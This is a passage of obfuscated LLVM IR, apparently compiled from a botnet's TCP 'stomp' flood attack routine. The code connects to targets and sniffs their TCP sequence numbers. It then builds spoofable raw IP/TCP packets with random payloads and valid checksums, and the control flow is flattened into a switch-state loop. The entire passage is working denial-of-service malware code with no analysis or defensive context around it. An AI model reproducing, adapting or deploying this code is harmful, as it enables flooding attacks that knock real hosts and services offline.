  %163 = load i32, i32* %11, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 2
  %167 = load i8, i8* %166, align 4
  %168 = zext i8 %167 to i32
  %169 = lshr i32 %161, %168
  %170 = add i32 %160, %169
  %171 = call i32 @htonl(i32 %170) #7
  %172 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %173 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %172, i32 0, i32 0
  store i32 %171, i32* %173, align 4
  store i32 -1791117669, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %176 = load i32, i32* %11, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i64 %177
  %179 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %178, i32 0, i32 1
  %180 = load i32, i32* %179, align 4
  %181 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %182 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %181, i32 0, i32 0
  store i32 %180, i32* %182, align 4
  store i32 -1791117669, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i16, i16* %19, align 2
  %185 = zext i16 %184 to i32
  %186 = icmp eq i32 %185, 65535
  %187 = select i1 %186, i32 559275813, i32 -760796712
  store i32 %187, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = call i32 @rand_next()
  %190 = and i32 %189, 65535
  %191 = trunc i32 %190 to i16
  %192 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  store i16 %191, i16* %192, align 2
  store i32 -1127045348, i32* %switchVar
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  %194 = load i16, i16* %19, align 2
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  store i16 %195, i16* %196, align 2
  store i32 -1127045348, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i32, i32* %29, align 4
  %199 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %200 = bitcast %struct.sockaddr_in* %30 to %struct.sockaddr*
  store %struct.sockaddr* %200, %struct.sockaddr** %199, align 8
  %201 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %202 = load %struct.sockaddr*, %struct.sockaddr** %201, align 8
  %203 = call i32 @connect(i32 %198, %struct.sockaddr* %202, i32 16)
  %204 = call i64 @time(i64* null) #6
  store i64 %204, i64* %34, align 8
  store i32 1685324422, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  store i32 0, i32* %36, align 4
  store i32 16, i32* %32, align 4
  %206 = load i32, i32* %12, align 4
  %207 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  %208 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %209 = bitcast %struct.sockaddr_in* %31 to %struct.sockaddr*
  store %struct.sockaddr* %209, %struct.sockaddr** %208, align 8
  %210 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %211 = load %struct.sockaddr*, %struct.sockaddr** %210, align 8
  %212 = call i64 @recvfrom(i32 %206, i8* %207, i64 256, i32 16384, %struct.sockaddr* %211, i32* %32)
  %213 = trunc i64 %212 to i32
  store i32 %213, i32* %36, align 4
  %214 = load i32, i32* %36, align 4
  %215 = icmp eq i32 %214, -1
  %216 = select i1 %215, i32 -787465542, i32 -1760989529
  store i32 %216, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  store i32 2020501901, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %31, i32 0, i32 2
  %220 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %219, i32 0, i32 0
  %221 = load i32, i32* %220, align 4
  %222 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %223 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %222, i32 0, i32 0
  %224 = load i32, i32* %223, align 4
  %225 = icmp eq i32 %221, %224
  %226 = select i1 %225, i32 1787450681, i32 -1886006807
  store i32 %226, i32* %switchVar
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  %228 = load i32, i32* %36, align 4
  %229 = sext i32 %228 to i64
  %230 = icmp ugt i64 %229, 40
  %231 = select i1 %230, i32 823377755, i32 -1886006807
  store i32 %231, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  %233 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  %234 = getelementptr inbounds i8, i8* %233, i64 20
  %235 = bitcast i8* %234 to %struct.tcphdr*
  store %struct.tcphdr* %235, %struct.tcphdr** %38, align 8
  %236 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 0
  %238 = load i16, i16* %237, align 4
  %239 = zext i16 %238 to i32
  %240 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %241 = load i16, i16* %240, align 2
  %242 = zext i16 %241 to i32
  %243 = icmp eq i32 %239, %242
  %244 = select i1 %243, i32 -2054541701, i32 -761005845
  store i32 %244, i32* %switchVar
  br label %loopEnd

; <label>:245:                                    ; preds = %loopEntry
  %246 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %247 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %246, i32 0, i32 4
  %248 = load i16, i16* %247, align 4
  %249 = lshr i16 %248, 9
  %250 = and i16 %249, 1
  %251 = zext i16 %250 to i32
  %252 = icmp ne i32 %251, 0
  %253 = select i1 %252, i32 -571111683, i32 42222709
  store i32 %253, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %256 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %255, i32 0, i32 4
  %257 = load i16, i16* %256, align 4
  %258 = lshr i16 %257, 12
  %259 = and i16 %258, 1
  %260 = zext i16 %259 to i32
  %261 = icmp ne i32 %260, 0
  %262 = select i1 %261, i32 -723025591, i32 42222709
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %265 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %264, i32 0, i32 0
  %266 = load i32, i32* %265, align 4
  %267 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %268 = load i32, i32* %11, align 4
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %267, i64 %269
  %271 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %270, i32 0, i32 0
  store i32 %266, i32* %271, align 4
  %272 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %273 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %272, i32 0, i32 2
  %274 = load i32, i32* %273, align 4
  %275 = call i32 @ntohl(i32 %274) #7
  %276 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %277 = load i32, i32* %11, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %276, i64 %278
  %280 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %279, i32 0, i32 1
  store i32 %275, i32* %280, align 4
  %281 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %282 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %281, i32 0, i32 3
  %283 = load i32, i32* %282, align 4
  %284 = call i32 @ntohl(i32 %283) #7
  %285 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %286 = load i32, i32* %11, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %288, i32 0, i32 2
  store i32 %284, i32* %289, align 4
  %290 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %291 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %290, i32 0, i32 1
  %292 = load i16, i16* %291, align 2
  %293 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %294 = load i32, i32* %11, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %296, i32 0, i32 3
  store i16 %292, i16* %297, align 4
  %298 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %299 = load i16, i16* %298, align 2
  %300 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %301 = load i32, i32* %11, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %300, i64 %302
  %304 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %303, i32 0, i32 4
  store i16 %299, i16* %304, align 2
  %305 = load i32, i32* %26, align 4
  %306 = sext i32 %305 to i64
  %307 = add i64 40, %306
  %308 = call noalias i8* @malloc(i64 %307) #6
  %309 = load i8**, i8*** %14, align 8
  %310 = load i32, i32* %11, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds i8*, i8** %309, i64 %311
  store i8* %308, i8** %312, align 8
  %313 = load i8**, i8*** %14, align 8
  %314 = load i32, i32* %11, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds i8*, i8** %313, i64 %315
  %317 = load i8*, i8** %316, align 8
  %318 = bitcast i8* %317 to %struct.iphdr*
  store %struct.iphdr* %318, %struct.iphdr** %39, align 8
  %319 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i64 1
  %321 = bitcast %struct.iphdr* %320 to %struct.tcphdr*
  store %struct.tcphdr* %321, %struct.tcphdr** %40, align 8
  %322 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %323 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %322, i64 1
  %324 = bitcast %struct.tcphdr* %323 to i8*
  store i8* %324, i8** %41, align 8
  %325 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %326 = bitcast %struct.iphdr* %325 to i8*
  %327 = load i8, i8* %326, align 4
  %328 = and i8 %327, 15
  %329 = or i8 %328, 64
  store i8 %329, i8* %326, align 4
  %330 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %331 = bitcast %struct.iphdr* %330 to i8*
  %332 = load i8, i8* %331, align 4
  %333 = and i8 %332, -16
  %334 = or i8 %333, 5
  store i8 %334, i8* %331, align 4
  %335 = load i8, i8* %15, align 1
  %336 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %337 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %336, i32 0, i32 1
  store i8 %335, i8* %337, align 1
  %338 = load i32, i32* %26, align 4
  %339 = sext i32 %338 to i64
  %340 = add i64 40, %339
  %341 = trunc i64 %340 to i16
  %342 = call zeroext i16 @htons(i16 zeroext %341) #7
  %343 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %344 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %343, i32 0, i32 2
  store i16 %342, i16* %344, align 2
  %345 = load i16, i16* %16, align 2
  %346 = call zeroext i16 @htons(i16 zeroext %345) #7
  %347 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 3
  store i16 %346, i16* %348, align 4
  %349 = load i8, i8* %17, align 1
  %350 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 5
  store i8 %349, i8* %351, align 4
  %352 = load i8, i8* %18, align 1
  %353 = icmp ne i8 %352, 0
  %354 = select i1 %353, i32 23526114, i32 -1182032490
  store i32 %354, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %357 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %358 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %357, i32 0, i32 4
  store i16 %356, i16* %358, align 2
  store i32 -1182032490, i32* %switchVar
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  %360 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %361 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %360, i32 0, i32 6
  store i8 6, i8* %361, align 1
  %362 = load i32, i32* @LOCAL_ADDR, align 4
  %363 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %364 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %363, i32 0, i32 8
  store i32 %362, i32* %364, align 4
  %365 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %366 = load i32, i32* %11, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %365, i64 %367
  %369 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %368, i32 0, i32 0
  %370 = load i32, i32* %369, align 4
  %371 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %372 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %371, i32 0, i32 9
  store i32 %370, i32* %372, align 4
  %373 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %374 = load i32, i32* %11, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %373, i64 %375
  %377 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %376, i32 0, i32 3
  %378 = load i16, i16* %377, align 4
  %379 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %380 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %379, i32 0, i32 0
  store i16 %378, i16* %380, align 4
  %381 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %382 = load i32, i32* %11, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %381, i64 %383
  %385 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %384, i32 0, i32 4
  %386 = load i16, i16* %385, align 2
  %387 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %388 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %387, i32 0, i32 1
  store i16 %386, i16* %388, align 2
  %389 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %390 = load i32, i32* %11, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %389, i64 %391
  %393 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %392, i32 0, i32 2
  %394 = load i32, i32* %393, align 4
  %395 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 2
  store i32 %394, i32* %396, align 4
  %397 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %398 = load i32, i32* %11, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %397, i64 %399
  %401 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %400, i32 0, i32 1
  %402 = load i32, i32* %401, align 4
  %403 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %404 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %403, i32 0, i32 3
  store i32 %402, i32* %404, align 4
  %405 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %406 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %405, i32 0, i32 4
  %407 = load i16, i16* %406, align 4
  %408 = and i16 %407, -241
  %409 = or i16 %408, 128
  store i16 %409, i16* %406, align 4
  %410 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 4
  %412 = load i16, i16* %411, align 4
  %413 = and i16 %412, -257
  %414 = or i16 %413, 256
  store i16 %414, i16* %411, align 4
  %415 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 4
  %417 = load i16, i16* %416, align 4
  %418 = and i16 %417, -4097
  %419 = or i16 %418, 4096
  store i16 %419, i16* %416, align 4
  %420 = call i32 @rand_next()
  %421 = and i32 %420, 65535
  %422 = trunc i32 %421 to i16
  %423 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %424 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %423, i32 0, i32 5
  store i16 %422, i16* %424, align 2
  %425 = load i8, i8* %20, align 1
  %426 = sext i8 %425 to i16
  %427 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %428 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %427, i32 0, i32 4
  %429 = load i16, i16* %428, align 4
  %430 = and i16 %426, 1
  %431 = shl i16 %430, 13
  %432 = and i16 %429, -8193
  %433 = or i16 %432, %431
  store i16 %433, i16* %428, align 4
  %434 = load i8, i8* %21, align 1
  %435 = sext i8 %434 to i16
  %436 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %437 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %436, i32 0, i32 4
  %438 = load i16, i16* %437, align 4
  %439 = and i16 %435, 1
  %440 = shl i16 %439, 12
  %441 = and i16 %438, -4097
  %442 = or i16 %441, %440
  store i16 %442, i16* %437, align 4
  %443 = load i8, i8* %22, align 1
  %444 = sext i8 %443 to i16
  %445 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %446 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %445, i32 0, i32 4
  %447 = load i16, i16* %446, align 4
  %448 = and i16 %444, 1
  %449 = shl i16 %448, 11
  %450 = and i16 %447, -2049
  %451 = or i16 %450, %449
  store i16 %451, i16* %446, align 4
  %452 = load i8, i8* %23, align 1
  %453 = sext i8 %452 to i16
  %454 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %455 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %454, i32 0, i32 4
  %456 = load i16, i16* %455, align 4
  %457 = and i16 %453, 1
  %458 = shl i16 %457, 10
  %459 = and i16 %456, -1025
  %460 = or i16 %459, %458
  store i16 %460, i16* %455, align 4
  %461 = load i8, i8* %24, align 1
  %462 = sext i8 %461 to i16
  %463 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %464 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %463, i32 0, i32 4
  %465 = load i16, i16* %464, align 4
  %466 = and i16 %462, 1
  %467 = shl i16 %466, 9
  %468 = and i16 %465, -513
  %469 = or i16 %468, %467
  store i16 %469, i16* %464, align 4
  %470 = load i8, i8* %25, align 1
  %471 = sext i8 %470 to i16
  %472 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %473 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %472, i32 0, i32 4
  %474 = load i16, i16* %473, align 4
  %475 = and i16 %471, 1
  %476 = shl i16 %475, 8
  %477 = and i16 %474, -257
  %478 = or i16 %477, %476
  store i16 %478, i16* %473, align 4
  %479 = load i8*, i8** %41, align 8
  %480 = load i32, i32* %26, align 4
  call void @rand_alpha_str(i8* %479, i32 %480)
  %481 = load i8*, i8** %41, align 8
  %482 = load i32, i32* %26, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds i8, i8* %481, i64 %483
  store i8 0, i8* %484, align 1
  store i32 707924296, i32* %switchVar
  br label %loopEnd

; <label>:485:                                    ; preds = %loopEntry
  %486 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %487 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %486, i32 0, i32 4
  %488 = load i16, i16* %487, align 4
  %489 = lshr i16 %488, 8
  %490 = and i16 %489, 1
  %491 = zext i16 %490 to i32
  %492 = icmp ne i32 %491, 0
  %493 = select i1 %492, i32 2078080985, i32 1074023110
  store i32 %493, i32* %switchVar
  br label %loopEnd

; <label>:494:                                    ; preds = %loopEntry
  %495 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %496 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %495, i32 0, i32 4
  %497 = load i16, i16* %496, align 4
  %498 = lshr i16 %497, 10
  %499 = and i16 %498, 1
  %500 = zext i16 %499 to i32
  %501 = icmp ne i32 %500, 0
  %502 = select i1 %501, i32 2078080985, i32 -221378678
  store i32 %502, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  %504 = load i32, i32* %29, align 4
  %505 = call i32 @close(i32 %504)
  store i32 -40841365, i32* %switchVar
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  store i32 1772753383, i32* %switchVar
  br label %loopEnd

; <label>:507:                                    ; preds = %loopEntry
  store i32 -761005845, i32* %switchVar
  br label %loopEnd

; <label>:508:                                    ; preds = %loopEntry
  store i32 -1886006807, i32* %switchVar
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  %510 = call i64 @time(i64* null) #6
  %511 = load i64, i64* %34, align 8
  %512 = sub nsw i64 %510, %511
  %513 = icmp sgt i64 %512, 10
  %514 = select i1 %513, i32 -635337616, i32 -603050200
  store i32 %514, i32* %switchVar
  br label %loopEnd

; <label>:515:                                    ; preds = %loopEntry
  %516 = load i32, i32* %29, align 4
  %517 = call i32 @close(i32 %516)
  store i32 -40841365, i32* %switchVar
  br label %loopEnd

; <label>:518:                                    ; preds = %loopEntry
  store i32 1685324422, i32* %switchVar
  br label %loopEnd

; <label>:519:                                    ; preds = %loopEntry
  store i32 278098356, i32* %switchVar
  br label %loopEnd

; <label>:520:                                    ; preds = %loopEntry
  %521 = load i32, i32* %11, align 4
  %522 = add nsw i32 %521, 1
  store i32 %522, i32* %11, align 4
  store i32 -2116605547, i32* %switchVar
  br label %loopEnd

; <label>:523:                                    ; preds = %loopEntry
  store i32 1591814268, i32* %switchVar
  br label %loopEnd

; <label>:524:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 212632030, i32* %switchVar
  br label %loopEnd

; <label>:525:                                    ; preds = %loopEntry
  %526 = load i32, i32* %11, align 4
  %527 = load i8, i8* %7, align 1
  %528 = zext i8 %527 to i32
  %529 = icmp slt i32 %526, %528
  %530 = select i1 %529, i32 -1200144957, i32 988037116
  store i32 %530, i32* %switchVar
  br label %loopEnd

; <label>:531:                                    ; preds = %loopEntry
  %532 = load i8**, i8*** %14, align 8
  %533 = load i32, i32* %11, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds i8*, i8** %532, i64 %534
  %536 = load i8*, i8** %535, align 8
  store i8* %536, i8** %42, align 8
  %537 = load i8*, i8** %42, align 8
  %538 = bitcast i8* %537 to %struct.iphdr*
  store %struct.iphdr* %538, %struct.iphdr** %43, align 8
  %539 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %540 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %539, i64 1
  %541 = bitcast %struct.iphdr* %540 to %struct.tcphdr*
  store %struct.tcphdr* %541, %struct.tcphdr** %44, align 8
  %542 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %543 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %542, i64 1
  %544 = bitcast %struct.tcphdr* %543 to i8*
  store i8* %544, i8** %45, align 8
  %545 = load i16, i16* %16, align 2
  %546 = zext i16 %545 to i32
  %547 = icmp eq i32 %546, 65535
  %548 = select i1 %547, i32 -158805784, i32 1980702208
  store i32 %548, i32* %switchVar
  br label %loopEnd

; <label>:549:                                    ; preds = %loopEntry
  %550 = call i32 @rand_next()
  %551 = and i32 %550, 65535
  %552 = trunc i32 %551 to i16
  %553 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %554 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %553, i32 0, i32 3
  store i16 %552, i16* %554, align 4
  store i32 1980702208, i32* %switchVar
  br label %loopEnd

; <label>:555:                                    ; preds = %loopEntry
  %556 = load i8, i8* %27, align 1
  %557 = icmp ne i8 %556, 0
  %558 = select i1 %557, i32 942230688, i32 1671400488
  store i32 %558, i32* %switchVar
  br label %loopEnd

; <label>:559:                                    ; preds = %loopEntry
  %560 = load i8*, i8** %45, align 8
  %561 = load i32, i32* %26, align 4
  call void @rand_alpha_str(i8* %560, i32 %561)
  %562 = load i8*, i8** %45, align 8
  %563 = load i32, i32* %26, align 4
  %564 = sext i32 %563 to i64
  %565 = getelementptr inbounds i8, i8* %562, i64 %564
  store i8 0, i8* %565, align 1
  store i32 1671400488, i32* %switchVar
  br label %loopEnd

; <label>:566:                                    ; preds = %loopEntry
  %567 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %568 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %567, i32 0, i32 7
  store i16 0, i16* %568, align 2
  %569 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %570 = bitcast %struct.iphdr* %569 to i16*
  %571 = call zeroext i16 @checksum_generic(i16* %570, i32 20)
  %572 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %573 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %572, i32 0, i32 7
  store i16 %571, i16* %573, align 2
  %574 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %575 = load i32, i32* %11, align 4
  %576 = sext i32 %575 to i64
  %577 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %574, i64 %576
  %578 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %577, i32 0, i32 1
  %579 = load i32, i32* %578, align 4
  %580 = add i32 %579, 1
  store i32 %580, i32* %578, align 4
  %581 = trunc i32 %579 to i16
  %582 = call zeroext i16 @htons(i16 zeroext %581) #7
  %583 = zext i16 %582 to i32
  %584 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %585 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %584, i32 0, i32 2
  store i32 %583, i32* %585, align 4
  %586 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %587 = load i32, i32* %11, align 4
  %588 = sext i32 %587 to i64
  %589 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %586, i64 %588
  %590 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %589, i32 0, i32 2
  %591 = load i32, i32* %590, align 4
  %592 = trunc i32 %591 to i16
  %593 = call zeroext i16 @htons(i16 zeroext %592) #7
  %594 = zext i16 %593 to i32
  %595 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %596 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %595, i32 0, i32 3
  store i32 %594, i32* %596, align 4
  %597 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %598 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %597, i32 0, i32 6
  store i16 0, i16* %598, align 4
  %599 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %600 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %601 = bitcast %struct.tcphdr* %600 to i8*
  %602 = load i32, i32* %26, align 4
  %603 = sext i32 %602 to i64
  %604 = add i64 20, %603
  %605 = trunc i64 %604 to i16
  %606 = call zeroext i16 @htons(i16 zeroext %605) #7
  %607 = load i32, i32* %26, align 4
  %608 = sext i32 %607 to i64
  %609 = add i64 20, %608
  %610 = trunc i64 %609 to i32
  %611 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %599, i8* %601, i16 zeroext %606, i32 %610)
  %612 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %613 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %612, i32 0, i32 6
  store i16 %611, i16* %613, align 4
  %614 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %615 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %614, i32 0, i32 1
  %616 = load i16, i16* %615, align 2
  %617 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %618 = load i32, i32* %11, align 4
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %617, i64 %619
  %621 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %620, i32 0, i32 0
  %622 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %621, i32 0, i32 1
  store i16 %616, i16* %622, align 2
  %623 = load i32, i32* %12, align 4
